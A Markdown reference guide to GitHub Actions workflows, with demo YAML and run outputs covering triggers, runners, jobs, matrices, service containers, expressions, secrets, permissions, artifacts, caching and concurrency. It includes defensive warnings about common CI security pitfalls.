
> [!info]- Workflow YAML breakdown
>
> - `on.repository_dispatch.types`: list of custom event types to filter on. The `event_type` in the API call must match
> - `github.event.client_payload`: JSON object sent by the API caller, accessible in expressions
> - `github.event.action`: the event type string

*Trigger a pipeline via the GitHub API.*

```bash
gh api repos/alp78/git-lab/dispatches --input - <<'EOF'
{
  "event_type": "run-pipeline",
  "client_payload": {
    "environment": "staging",
    "ref": "main",
    "triggered_by": "vault-demo"
  }
}
EOF
```

*Workflow run output (run #1, triggered by repository_dispatch):*

```text
=== repository_dispatch trigger ===
Event type: run-pipeline
Actor: alp78

Client payload:
{
  "environment": "staging",
  "ref": "main",
  "triggered_by": "vault-demo"
}

Use cases:
  - External systems triggering GitHub workflows
  - Cross-repo orchestration
  - Webhook-driven pipelines
```

### GitHub Actions | triggers | release

Use this pattern when release-driven deployment — trigger a deploy, publish, or changelog generation when a GitHub release is created.
**Trust boundary:** Runs on the tag/branch associated with the release. Full secrets available.

```yaml
on:
  release:
    types: [published]
```

The `github.event.release` object contains the tag name, release name, body, and whether it's a pre-release. Common pattern: `if: ${{ !github.event.release.prerelease }}` to skip pre-releases.

### GitHub Actions | triggers | workflow_call (reusable workflow)

Use this pattern when sharing workflow logic across repositories or within a monorepo. The called workflow receives inputs and can return outputs.
**Trust boundary:** Inherits the caller's `GITHUB_TOKEN` permissions. Secrets must be explicitly passed.

> [!info]- Workflow YAML breakdown
>
> - `on.workflow_call.inputs`: declares input parameters (string, boolean, number)
> - `on.workflow_call.outputs`: declares output values returned to the caller via `jobs.<id>.outputs`
> - `on.workflow_call.secrets`: declares secrets that the caller must pass
> - The caller uses `uses: ./.github/workflows/<file>@<ref>` (same repo) or `uses: owner/repo/.github/workflows/<file>@<ref>` (cross-repo)
> - Maximum nesting depth: 4 levels of reusable workflows

*Reusable workflow (called) — accepts inputs and returns outputs.*

```yaml
name: "Demo: Reusable Workflow (Called)"
on:
  workflow_call:
    inputs:
      environment:
        description: "Target environment name"
        required: true
        type: string
      python-version:
        description: "Python version to use"
        required: false
        type: string
        default: "3.12"
    outputs:
      deploy-url:
        description: "The deployment URL"
        value: ${{ jobs.deploy.outputs.url }}
    secrets:
      deploy-token:
        description: "Deployment authentication token"
        required: false

jobs:
  deploy:
    runs-on: ubuntu-latest
    outputs:
      url: ${{ steps.deploy.outputs.url }}
    steps:
      - uses: actions/checkout@v4
      - name: Simulate deployment
        id: deploy
        run: |
          URL="https://${{ inputs.environment }}.example.com"
          echo "url=$URL" >> "$GITHUB_OUTPUT"
          echo "Deployed to $URL"
```

*Caller workflow — invokes the reusable workflow.*

```yaml
name: "Demo: Reusable Workflow (Caller)"
on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  call-reusable:
    uses: ./.github/workflows/demo-reusable-called.yml
    with:
      environment: staging
      python-version: "3.12"
    secrets:
      deploy-token: ${{ secrets.DEMO_SECRET }}

  show-result:
    needs: call-reusable
    runs-on: ubuntu-latest
    steps:
      - name: Show reusable workflow output
        run: |
          echo "Deploy URL: ${{ needs.call-reusable.outputs.deploy-url }}"
```

*Workflow run output (run #1, triggered by push to main):*

```text
=== Reusable workflow (called) ===
Environment: staging
Python version: 3.12
Deploy token provided: true
Deployed to https://staging.example.com

=== Caller workflow ===
Deploy URL from reusable workflow: https://staging.example.com
```

### GitHub Actions | triggers | workflow_run

Use this pattern when chaining workflows — run a deployment after CI passes, aggregate results from fork PR workflows, or post-process artifacts.
**Trust boundary:** Always runs on the **default branch** (main), regardless of the triggering workflow's branch. Full secrets available.

> [!info]- Workflow YAML breakdown
>
> - `on.workflow_run.workflows`: list of workflow names (not filenames) to watch
> - `on.workflow_run.types`: `[completed]`, `[requested]`, or both
> - `github.event.workflow_run`: contains the triggering workflow's conclusion, branch, SHA, and actor
> - Use `if: ${{ github.event.workflow_run.conclusion == 'success' }}` to only run on success

*Run a post-processing workflow after the push trigger completes.*

```yaml
name: "Demo: Workflow Run Trigger"
on:
  workflow_run:
    workflows: ["Demo: Push Trigger"]
    types: [completed]

permissions:
  contents: read

jobs:
  post-push:
    runs-on: ubuntu-latest
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    steps:
      - name: Show workflow_run context
        run: |
          echo "Triggering workflow: ${{ github.event.workflow_run.name }}"
          echo "Triggering conclusion: ${{ github.event.workflow_run.conclusion }}"
          echo "Triggering branch: ${{ github.event.workflow_run.head_branch }}"
          echo "Triggering SHA: ${{ github.event.workflow_run.head_sha }}"
          echo "Triggering actor: ${{ github.event.workflow_run.actor.login }}"
```

*Workflow run output (run #1, triggered by completion of "Demo: Push Trigger"):*

```text
=== workflow_run trigger ===
This workflow was triggered by the completion of another workflow.

Triggering workflow: Demo: Push Trigger
Triggering workflow ID: 24312297713
Triggering conclusion: success
Triggering branch: main
Triggering SHA: 739cdaf09d0d5a4ed7cfd46827a602fca7311af5
Triggering actor: alp78

IMPORTANT: workflow_run always runs on the DEFAULT branch (main).
It does NOT run the code from the triggering branch.
This has security implications — the called workflow is trusted code.
```

### GitHub Actions | triggers | merge_group

Use this pattern when repos with merge queues enabled. The `merge_group` event fires when a PR is added to the merge queue, running checks against the tentative merge result.

```yaml
on:
  merge_group:
    types: [checks_requested]
```

> [!warning] Missing merge_group trigger blocks the merge queue
>
> If you enable merge queues on a branch but your required status checks only trigger on `pull_request`, they will never run for the merge queue entries and the queue will be permanently stuck.

> [!success] Add merge_group alongside pull_request
>
> ```yaml
> on:
>   pull_request:
>     branches: [main]
>   merge_group:
> ```

### GitHub Actions | triggers | issue_comment

Use this pattern when slash-command bots — `/deploy`, `/rerun`, `/approve` comments that trigger workflows.
**Trust boundary:** Fires for comments on both issues and PRs. **Runs on the default branch** with full secrets.

> [!danger] issue_comment runs on the default branch, not the PR branch
>
> If an issue_comment workflow checks out the PR branch and runs code from it, any user who can comment on an issue can execute arbitrary code with full repo secrets. This is equivalent to the `pull_request_target` attack.

> [!success] Safe pattern for issue_comment
>
> 1. Check that the commenter has write access: `if: github.event.comment.author_association == 'MEMBER'`
> 2. Only trigger on specific comment bodies: `if: contains(github.event.comment.body, '/deploy')`
> 3. Never check out untrusted code with secrets available

### GitHub Actions | triggers | multiple triggers

Combine multiple triggers — the workflow runs when **any** of them fires.

```yaml
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  workflow_dispatch:
  schedule:
    - cron: "45 * * * *"
```

Use `github.event_name` to branch logic based on which trigger fired.

## Runners

Runners are the servers that execute workflow jobs. Each job runs on a fresh runner instance.

### GitHub Actions | runners | GitHub-hosted runners

GitHub provides managed, ephemeral VMs with pre-installed tools. The VM is created fresh for each job and destroyed after the job completes.

| Label | OS | vCPU | RAM | Disk | Per-minute cost (public) |
|-------|-----|------|-----|------|--------------------------|
| `ubuntu-latest` | Ubuntu 24.04 | 4 | 16 GB | 14 GB SSD | Free (2,000 min/mo) |
| `windows-latest` | Windows Server 2022 | 4 | 16 GB | 14 GB SSD | 2× Linux rate |
| `macos-latest` | macOS 14 (Sonoma) | 3 (M1) | 7 GB | 14 GB SSD | 10× Linux rate |

### GitHub Actions | runners | self-hosted runners

Use this pattern when GPU workloads, private network access, compliance requirements, or cost savings at scale.

> [!danger] Self-hosted runners without isolation are a security risk
>
> Unlike GitHub-hosted runners, self-hosted runners are **not ephemeral by default**. A malicious workflow can persist files, install backdoors, or exfiltrate credentials. Any fork PR can run code on your self-hosted runner if not restricted.

> [!success] Secure self-hosted runner patterns
>
> - Run self-hosted runners in ephemeral/JIT mode (auto-register, run one job, auto-deregister)
> - Restrict runner groups to specific repositories
> - Use container-based isolation (Docker-in-Docker or Kubernetes with `actions-runner-controller`)
> - Never expose self-hosted runners to public repos with fork PRs enabled

### GitHub Actions | runners | larger and ephemeral runners

GitHub offers larger runner sizes for performance-intensive workloads. Available on GitHub Team and Enterprise plans.

| Size | vCPU | RAM | Use case |
|------|------|-----|----------|
| `ubuntu-latest-4-cores` | 4 | 16 GB | Standard CI |
| `ubuntu-latest-8-cores` | 8 | 32 GB | Parallel test suites |
| `ubuntu-latest-16-cores` | 16 | 64 GB | Docker builds, ML training |
| `ubuntu-latest-32-cores` | 32 | 128 GB | Large monorepo builds |

## Jobs

Jobs are the primary units of work. Each job runs on a fresh runner VM.

### GitHub Actions | jobs | sequential dependencies (needs)

Use `needs:` to create job dependencies. A job only starts after all jobs listed in `needs:` complete successfully.

```yaml
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - run: echo "linting..."

  test:
    needs: lint
    runs-on: ubuntu-latest
    steps:
      - run: echo "testing..."

  deploy:
    needs: [lint, test]
    runs-on: ubuntu-latest
    steps:
      - run: echo "deploying..."
```

Without `needs:`, all three jobs would run in parallel.

### GitHub Actions | jobs | matrix strategy

Use a matrix when the same job must run across multiple Python versions, operating systems, or configuration variants. One job definition expands into multiple parallel job instances, each with a different parameter combination.

> [!info]- Workflow YAML breakdown
>
> - `strategy.matrix`: defines the parameter axes and their values
> - `strategy.fail-fast`: if `true` (default), cancels remaining jobs when one fails. Set to `false` to run all combinations
> - `strategy.max-parallel`: limits concurrent matrix jobs. Default: unlimited
> - `include`: adds extra combinations or extra properties to existing combinations
> - `exclude`: removes specific combinations from the generated matrix
> - Access values via `${{ matrix.<key> }}`

*Test across Python 3.11 and 3.12 with an experimental flag on 3.12.*

```yaml
name: "Demo: Matrix Strategy"
on:
  push:
    branches: [main]
    paths:
      - ".github/workflows/demo-matrix.yml"
  workflow_dispatch:

permissions:
  contents: read

jobs:
  matrix-test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 3
      matrix:
        python-version: ["3.10", "3.11", "3.12"]
        os: [ubuntu-latest]
        include:
          - python-version: "3.12"
            os: ubuntu-latest
            experimental: true
        exclude:
          - python-version: "3.10"
            os: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
      - name: Show matrix values
        run: |
          echo "Python: ${{ matrix.python-version }}"
          echo "OS: ${{ matrix.os }}"
          echo "Experimental: ${{ matrix.experimental }}"
          python --version
```

*Workflow run output (run #1 — two matrix combinations after exclude):*

```text
# Combination 1: Python 3.11
Python: 3.11
OS: ubuntu-latest
Experimental:
Python 3.11.15

# Combination 2: Python 3.12 (experimental)
Python: 3.12
OS: ubuntu-latest
Experimental: true
Python 3.12.13
```

| Key | Type | Default | Description |
|-----|------|---------|-------------|
| `strategy.matrix` | object | — | Parameter axes and values |
| `strategy.fail-fast` | boolean | `true` | Cancel remaining jobs on first failure |
| `strategy.max-parallel` | integer | unlimited | Maximum concurrent matrix jobs |
| `include` | list | — | Add combinations or properties |
| `exclude` | list | — | Remove combinations |

### GitHub Actions | jobs | job outputs

Declare outputs at the job level to pass data to downstream jobs via `needs.<job>.outputs.<name>`.

```yaml
jobs:
  producer:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.set_version.outputs.version }}
    steps:
      - name: Set version
        id: set_version
        run: echo "version=1.2.3" >> "$GITHUB_OUTPUT"

  consumer:
    needs: producer
    runs-on: ubuntu-latest
    steps:
      - run: echo "Version: ${{ needs.producer.outputs.version }}"
```

### GitHub Actions | jobs | job containers and service containers

Use this pattern when integration testing with real databases, message queues, or other services. The operational goal is to attach Docker containers alongside the job runner for end-to-end testing without mocks.

> [!info]- Workflow YAML breakdown
>
> - `services.<name>.image`: Docker image to pull (e.g., `postgres:16`)
> - `services.<name>.env`: environment variables for the container
> - `services.<name>.ports`: port mappings from container to runner
> - `services.<name>.options`: Docker CLI options — use for health checks to wait for container readiness
> - Health check options: `--health-cmd`, `--health-interval`, `--health-timeout`, `--health-retries`

*PostgreSQL service container for integration testing.*

```yaml
name: "Demo: Service Container"
on:
  push:
    branches: [main]
    paths:
      - ".github/workflows/demo-service-container.yml"
  workflow_dispatch:

permissions:
  contents: read

jobs:
  integration-test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_USER: testuser
          POSTGRES_PASSWORD: testpass
          POSTGRES_DB: testdb
        ports:
          - 5432:5432
        options: >-
          --health-cmd="pg_isready -U testuser"
          --health-interval=10s
          --health-timeout=5s
          --health-retries=5
    steps:
      - uses: actions/checkout@v4
      - name: Run integration test
        env:
          PGHOST: localhost
          PGPORT: 5432
          PGUSER: testuser
          PGPASSWORD: testpass
          PGDATABASE: testdb
        run: |
          echo "Creating test table..."
          psql -c "CREATE TABLE orders (id SERIAL PRIMARY KEY, amount DECIMAL, created_at TIMESTAMP DEFAULT NOW());"
          echo "Inserting test data..."
          psql -c "INSERT INTO orders (amount) VALUES (99.99), (149.50), (200.00);"
          echo "Running validation query..."
          psql -c "SELECT COUNT(*) AS order_count, SUM(amount) AS total FROM orders;"
```

*Workflow run output (run #1, triggered by push to main):*

```text
PostgreSQL is ready after 1 attempts
=== Service container demo ===
Creating test table...
CREATE TABLE

Inserting test data...
INSERT 0 3

Running validation query...
 order_count | total
-------------+--------
           3 | 449.49
(1 row)

Service container provides a real PostgreSQL instance.
No mocking needed — this is a true integration test.
```

## Steps

Steps are the individual tasks within a job. They execute sequentially and share the runner's filesystem.

### GitHub Actions | steps | uses (actions)

The `uses:` key references a reusable action. Actions are pulled from GitHub repos, Docker images, or local paths.

```yaml
steps:
  # GitHub Marketplace action (pinned to tag)
  - uses: actions/checkout@v4

  # Same action pinned to full SHA (more secure)
  - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5

  # Action from another repo
  - uses: google-github-actions/auth@v2
    with:
      workload_identity_provider: ${{ secrets.GCP_WORKLOAD_IDENTITY_PROVIDER }}

  # Local action from the same repo
  - uses: ./.github/actions/my-custom-action
```

### GitHub Actions | steps | continue-on-error semantics

Use `continue-on-error` when a step may fail without invalidating the entire job, such as flaky diagnostics, optional checks, or best-effort notifications. The flag turns that step failure into a soft success while still preserving the failure details in the logs and UI.

*Step-level vs job-level continue-on-error behavior.*

```yaml
name: "Demo: Continue on Error"
on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  step-level:
    runs-on: ubuntu-latest
    steps:
      - name: Failing step (with continue-on-error)
        id: flaky
        continue-on-error: true
        run: exit 1

      - name: Check outcome after failure
        run: |
          echo "flaky.outcome: ${{ steps.flaky.outcome }}"
          echo "flaky.conclusion: ${{ steps.flaky.conclusion }}"

      - name: Conditional cleanup
        if: ${{ steps.flaky.outcome == 'failure' }}
        run: echo "Running cleanup because the flaky step failed."
```

*Workflow run output (run #1, triggered by push to main):*

```text
=== Step-level continue-on-error ===
flaky.outcome: failure
flaky.conclusion: success

outcome = raw result: failure
conclusion = after continue-on-error applied: success

The job status is still 'success' because
continue-on-error converted the failure.
Running cleanup because the flaky step failed.
```

> [!warning] Job-level continue-on-error hides real failures
>
> Setting `continue-on-error: true` at the **job** level makes the overall workflow show as "success" even when the job fails. Downstream jobs via `needs:` will see the job result as `success`. This masks genuine failures and breaks CI signal.

> [!success] Use step-level, not job-level
>
> Apply `continue-on-error` to individual steps, not entire jobs. Check `steps.<id>.outcome` in a subsequent step to handle the failure explicitly.

| Property | `outcome` | `conclusion` |
|----------|-----------|--------------|
| Definition | Raw execution result | Result after `continue-on-error` |
| When continue-on-error is true | `failure` | `success` |
| When continue-on-error is false | `failure` | `failure` |
| Use for conditionals | `${{ steps.<id>.outcome == 'failure' }}` | N/A |

## Expressions and Contexts

### GitHub Actions | expressions | syntax and operators

Expressions use the `${{ }}` syntax and are evaluated at workflow-processing time.

| Operator | Example | Description |
|----------|---------|-------------|
| `==` | `github.ref == 'refs/heads/main'` | Equality (case-insensitive for strings) |
| `!=` | `github.actor != 'dependabot[bot]'` | Inequality |
| `&&` | `success() && github.ref == 'refs/heads/main'` | Logical AND |
| `\|\|` | `failure() \|\| cancelled()` | Logical OR |
| `!` | `!contains(github.event.head_commit.message, '[skip ci]')` | Logical NOT |

**String functions:** `contains()`, `startsWith()`, `endsWith()`, `format()`, `join()`, `toJSON()`, `fromJSON()`, `hashFiles()`

*Expression evaluation output.*

```text
=== String functions ===
contains('Hello World', 'World'): true
startsWith('main', 'mai'): true
endsWith('feature/abc', 'abc'): true
format('{0}-{1}', 'hello', 'world'): hello-world

=== Type coercion ===
Null to string: '' (empty string)
Boolean to string: 'true' (literal 'true')

GOTCHA: In expressions, 0 and '' are falsy.
Expression evaluation happens BEFORE shell execution.
```

### GitHub Actions | expressions | status functions

| Function | Behavior | Implicit in `if:`? |
|----------|----------|-------------------|
| `success()` | True if no previous step failed or was cancelled | Yes — every `if:` implicitly starts with `success() &&` unless you use `always()`, `failure()`, or `cancelled()` |
| `failure()` | True if any previous step failed | No |
| `cancelled()` | True if the workflow was cancelled | No |
| `always()` | Always true — step runs even after failure or cancellation | No |

### GitHub Actions | expressions | type coercion pitfalls

> [!warning] Expression types are not shell types
>
> In expressions, `null` coerces to `''`, `false` coerces to `'false'` (a truthy string in shell), and `0` coerces to `'0'` (also truthy in shell). Always compare explicitly: `if: ${{ inputs.dry_run == true }}` instead of `if: ${{ inputs.dry_run }}`.

### GitHub Actions | contexts | github, runner, env, steps, needs

*Dump all major contexts in a single workflow.*

```yaml
name: "Demo: Contexts"
on:
  push:
    branches: [main]
    paths:
      - ".github/workflows/demo-contexts.yml"
  workflow_dispatch:

permissions:
  contents: read

env:
  WORKFLOW_VAR: "workflow-level-value"

jobs:
  show-contexts:
    runs-on: ubuntu-latest
    env:
      JOB_VAR: "job-level-value"
    outputs:
      job_result: ${{ steps.produce.outputs.value }}
    steps:
      - name: GitHub context
        run: |
          echo "repository: ${{ github.repository }}"
          echo "event_name: ${{ github.event_name }}"
          echo "ref: ${{ github.ref }}"
          echo "sha: ${{ github.sha }}"
          echo "actor: ${{ github.actor }}"
          echo "run_id: ${{ github.run_id }}"
          echo "run_number: ${{ github.run_number }}"

      - name: Runner context
        run: |
          echo "os: ${{ runner.os }}"
          echo "arch: ${{ runner.arch }}"
          echo "name: ${{ runner.name }}"
          echo "temp: ${{ runner.temp }}"

      - name: Env context
        env:
          STEP_VAR: "step-level-value"
        run: |
          echo "WORKFLOW_VAR: ${{ env.WORKFLOW_VAR }}"
          echo "JOB_VAR: ${{ env.JOB_VAR }}"
          echo "STEP_VAR: ${{ env.STEP_VAR }}"

      - name: Produce an output
        id: produce
        run: echo "value=hello-from-step" >> "$GITHUB_OUTPUT"

      - name: Steps context
        run: echo "produce.outputs.value: ${{ steps.produce.outputs.value }}"

  consume-output:
    needs: show-contexts
    runs-on: ubuntu-latest
    steps:
      - name: Needs context
        run: |
          echo "show-contexts.outputs.job_result: ${{ needs.show-contexts.outputs.job_result }}"
          echo "show-contexts.result: ${{ needs.show-contexts.result }}"
```

*Workflow run output (run #1, triggered by push to main):*

```text
=== github context ===
repository: alp78/git-lab
event_name: push
ref: refs/heads/main
sha: 739cdaf09d0d5a4ed7cfd46827a602fca7311af5
actor: alp78
run_id: 24312297711
run_number: 1

=== runner context ===
os: Linux
arch: X64
name: GitHub Actions 1000000619
temp: /home/runner/work/_temp

=== env context ===
WORKFLOW_VAR: workflow-level-value
JOB_VAR: job-level-value
STEP_VAR: step-level-value

=== steps context ===
produce.outputs.value: hello-from-step

=== needs context ===
show-contexts.outputs.job_result: hello-from-step
show-contexts.result: success
```

## Environment Variables and Outputs

### GitHub Actions | variables | env levels (workflow, job, step)

Environment variables cascade from workflow → job → step, with narrower scopes overriding broader ones.

```yaml
env:
  LEVEL: "workflow"      # Available to all jobs and steps

jobs:
  demo:
    env:
      LEVEL: "job"       # Overrides workflow-level for this job
    steps:
      - env:
          LEVEL: "step"  # Overrides job-level for this step
        run: echo "$LEVEL"  # Prints: step
```

### GitHub Actions | variables | GITHUB_OUTPUT

Use this pattern when passing computed values from one step to another, or from a job to downstream jobs. The operational goal is to replace the deprecated `::set-output` workflow command.

```yaml
- name: Set version
  id: set_version
  run: echo "version=1.2.3" >> "$GITHUB_OUTPUT"

- name: Use version
  run: echo "Version is ${{ steps.set_version.outputs.version }}"
```

*Workflow run output showing GITHUB_OUTPUT and GITHUB_ENV data flow:*

```text
Wrote version=1.2.3 to GITHUB_OUTPUT
Wrote ts=20260412-172939 to GITHUB_OUTPUT
Wrote BUILD_TAG to GITHUB_ENV
BUILD_TAG from GITHUB_ENV: build-20260412

=== Data received from producer job ===
Version: 1.2.3
Timestamp: 20260412-172939
Producer result: success

Key point: GITHUB_ENV does NOT cross job boundaries.
Only values declared in jobs.<id>.outputs and written
to GITHUB_OUTPUT are available via needs.<id>.outputs.
```

### GitHub Actions | variables | GITHUB_STEP_SUMMARY

Use this pattern when generating human-readable reports (test results, build metrics, deployment status) visible on the workflow run page. The operational goal is to write GitHub-flavored markdown to the job summary section.

```yaml
- name: Write summary
  run: |
    echo "## Build Report" >> "$GITHUB_STEP_SUMMARY"
    echo "| Metric | Value |" >> "$GITHUB_STEP_SUMMARY"
    echo "|--------|-------|" >> "$GITHUB_STEP_SUMMARY"
    echo "| Run | #${{ github.run_number }} |" >> "$GITHUB_STEP_SUMMARY"
    echo "| Status | :white_check_mark: Passed |" >> "$GITHUB_STEP_SUMMARY"
```

Maximum size: 1 MiB per step, 1 MiB total per job. Multiple steps can append to the same summary.

### GitHub Actions | variables | default environment variables

| Variable | Value |
|----------|-------|
| `GITHUB_REPOSITORY` | `owner/repo` |
| `GITHUB_SHA` | Full commit SHA |
| `GITHUB_REF` | `refs/heads/branch` or `refs/tags/tag` |
| `GITHUB_REF_NAME` | Branch or tag name without `refs/` prefix |
| `GITHUB_WORKSPACE` | Checkout directory path |
| `GITHUB_RUN_ID` | Unique numeric run identifier |
| `GITHUB_RUN_NUMBER` | Sequential run counter for the workflow |
| `GITHUB_RUN_ATTEMPT` | Re-run attempt number (starts at 1) |
| `GITHUB_ACTOR` | Username that triggered the run |
| `GITHUB_EVENT_NAME` | Event that triggered the run |
| `RUNNER_OS` | `Linux`, `Windows`, or `macOS` |
| `RUNNER_ARCH` | `X64`, `ARM`, or `ARM64` |

## Secrets and Permissions

### GitHub Actions | secrets | types and scoping

| Scope | Set via | Precedence | Use case |
|-------|---------|------------|----------|
| **Repository** | Settings → Secrets → Actions | Base level | Repo-specific credentials |
| **Environment** | Settings → Environments → Secrets | Overrides repo | Per-environment credentials (staging vs production) |
| **Organization** | Org Settings → Secrets | Lowest (overridden by repo/env) | Shared credentials across repos |

Secrets are encrypted at rest and masked in logs. They are not available to fork PRs (with `pull_request` trigger) unless the repo admin explicitly enables it.

### GitHub Actions | secrets | accessing secrets safely

```yaml
steps:
  - name: Use a secret safely
    env:
      DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
    run: |
      echo "Connecting to database..."
      psql "postgresql://user:${DB_PASSWORD}@host/db"
```

> [!danger] Never interpolate secrets directly in shell commands
>
> ```yaml
> # DANGEROUS — secrets in command line are visible in process listings
> run: curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://api.example.com
> ```

> [!success] Always pass secrets through environment variables
>
> ```yaml
> env:
>   TOKEN: ${{ secrets.TOKEN }}
> run: curl -H "Authorization: Bearer $TOKEN" https://api.example.com
> ```

### GitHub Actions | secrets | GITHUB_TOKEN

The `GITHUB_TOKEN` is automatically created for each workflow run. It authenticates API calls to the GitHub API for the repository.

### GitHub Actions | permissions | permissions block

Declare explicit `permissions` in every workflow. The goal is to scope `GITHUB_TOKEN` to only the capabilities the workflow actually needs instead of inheriting a broader default token surface.

```yaml
permissions:
  contents: read       # Read repo contents (checkout)
  pull-requests: write # Comment on PRs
  id-token: write      # Request OIDC token for cloud auth
```

When you set `permissions:` at the workflow or job level, **all unspecified scopes default to `none`**. This is the desired behavior — it enforces least privilege.

| Scope | Read | Write | Common use case |
|-------|------|-------|-----------------|
| `contents` | Checkout code | Push commits, create releases | Most workflows |
| `pull-requests` | Read PR data | Comment, label, approve | CI status reporting |
| `issues` | Read issues | Create, comment, label | Automation bots |
| `id-token` | — | Request OIDC JWT | Cloud authentication (GCP, AWS, Azure) |
| `packages` | Pull packages | Push packages | Container registry |
| `actions` | Read workflow data | Cancel/re-run workflows | Orchestration |
| `deployments` | Read deployments | Create deployments | CD pipelines |
| `statuses` | Read commit statuses | Create commit statuses | External CI integration |
| `security-events` | Read alerts | Upload SARIF | CodeQL, dependency scanning |

> [!danger] Implicit permissions are over-broad
>
> Without a `permissions:` block, `GITHUB_TOKEN` receives the repository's default permissions — which for private repos is read/write on most scopes. A compromised action could push code, delete branches, or modify issues.

> [!success] Always set explicit permissions
>
> Add `permissions:` at the workflow level. Start with `contents: read` and add only what the workflow needs. Review permissions whenever adding new actions.

## Artifacts and Caching

### GitHub Actions | artifacts | upload and download

Use this pattern when passing build outputs between jobs, storing test reports, retaining deployment manifests.

> [!info]- Workflow YAML breakdown
>
> - `actions/upload-artifact@v4`: uploads files from the runner to GitHub's artifact storage
> - `name`: artifact name — must be unique within the run
> - `path`: file or directory to upload (glob patterns supported)
> - `retention-days`: how long to keep the artifact (default: 90, max: 400)
> - `actions/download-artifact@v4`: downloads artifacts in a subsequent job
> - Omit `name:` in download to get all artifacts at once

*Upload and download artifacts between jobs.*

```yaml
name: "Demo: Artifacts"
on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Generate build artifacts
        run: |
          mkdir -p dist reports
          echo '{"version": "1.0.0", "build": "${{ github.run_number }}"}' > dist/manifest.json
          echo "SELECT COUNT(*) FROM orders;" > dist/validation_query.sql
          echo "Test results: 42 passed, 0 failed" > reports/test-results.txt
          echo "Coverage: 87.3%" > reports/coverage.txt

      - name: Upload build artifacts
        uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/
          retention-days: 5

      - name: Upload test reports
        uses: actions/upload-artifact@v4
        with:
          name: test-reports
          path: reports/
          retention-days: 30

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - name: Download build artifacts
        uses: actions/download-artifact@v4
        with:
          name: build-output
          path: ./downloaded-build

      - name: Verify downloaded artifacts
        run: |
          ls -la downloaded-build/
          cat downloaded-build/manifest.json
```

*Workflow run output (run #1, triggered by push to main):*

```text
Generated artifacts in dist/ and reports/
Artifact build-output.zip successfully finalized. Artifact ID 6394260342
Artifact test-reports.zip successfully finalized. Artifact ID 6394260393

=== Downloaded artifacts ===
manifest.json    validation_query.sql

Manifest contents:
{"version": "1.0.0", "build": "1"}
```

| Key | Default | Description |
|-----|---------|-------------|
| `name` | — | Artifact name (must be unique within the run) |
| `path` | — | File/directory to upload (glob patterns supported) |
| `retention-days` | 90 | Days to retain the artifact (max: 400) |
| `if-no-files-found` | `warn` | Behavior when no files match: `warn`, `error`, `ignore` |
| `compression-level` | 6 | zlib compression level (0=none, 9=max) |
| `overwrite` | `false` | Whether to overwrite an existing artifact with the same name |

### GitHub Actions | caching | actions/cache

Use this pattern when avoiding repeated downloads of dependencies (pip, npm, Docker layers) across runs. The operational goal is to store and restore a directory tree keyed by a hash of a lockfile.

*Cache pip packages keyed by requirements.txt hash.*

```yaml
name: "Demo: Caching"
on:
  push:
    branches: [main]
    paths:
      - ".github/workflows/demo-cache.yml"
      - "requirements.txt"
  workflow_dispatch:

permissions:
  contents: read

jobs:
  cache-demo:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Cache pip packages
        id: pip-cache
        uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          key: pip-${{ runner.os }}-${{ hashFiles('requirements.txt') }}
          restore-keys: |
            pip-${{ runner.os }}-

      - name: Show cache result
        run: |
          echo "Cache hit: ${{ steps.pip-cache.outputs.cache-hit }}"

      - name: Install dependencies
        run: pip install -r requirements.txt
```

*Workflow run output (run #1 — first run, cache miss):*

```text
Cache not found for input keys:
  pip-Linux-be654b93dbe1ff76cb7cbd515b434dad18ea380de7eb66ca7ef0e5d690cbce5c,
  pip-Linux-

=== Cache result ===
Cache hit:
Cache miss — packages will be downloaded and cached after the job.

Post job cleanup:
Cache saved with key: pip-Linux-be654b93dbe1ff76cb7cbd515b434dad18ea380de7eb66ca7ef0e5d690cbce5c
```

| Key | Default | Description |
|-----|---------|-------------|
| `path` | — | Directory to cache (e.g., `~/.cache/pip`, `node_modules`) |
| `key` | — | Exact cache key — typically includes `hashFiles()` of a lockfile |
| `restore-keys` | — | Fallback key prefixes for partial cache matches |
| `save-always` | `false` | Save the cache even if the job fails |
| `lookup-only` | `false` | Check for cache existence without restoring |

> [!warning] Stale or poisoned caches
>
> Caches are scoped to the branch and its ancestors. A cache created on a feature branch is accessible to that branch and its parent (usually main), but not to sibling branches. A poisoned cache (one with tampered dependencies) on main can affect all branches. Caches are evicted after 7 days of no access or when the repo exceeds the 10 GB limit.

> [!success] Defensive caching patterns
>
> - Always include `hashFiles()` of the lockfile in the cache key — this ensures the cache is invalidated when dependencies change
> - Use `restore-keys` for partial matches (faster restores when only a few packages changed)
> - Pin `actions/cache` to a full SHA to prevent supply-chain attacks on the caching mechanism itself

## Concurrency

### GitHub Actions | concurrency | cancel-in-progress

Use concurrency cancellation when a newer push makes the current in-progress run obsolete and there is no value in finishing the older run.

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

This creates a concurrency group per workflow + branch. If a new run starts in the same group, the previous run is cancelled.

*Workflow run output (run #1, no cancellation — single push):*

```text
=== Concurrency demo ===
Concurrency group: demo-refs/heads/main
cancel-in-progress: true

If another push happens to this branch while this run is active,
this run will be cancelled and replaced by the new one.

Simulating a 30-second deployment...
Deploy step 1/6...
Deploy step 2/6...
Deploy step 3/6...
Deploy step 4/6...
Deploy step 5/6...
Deploy step 6/6...
Deployment simulation complete.
```

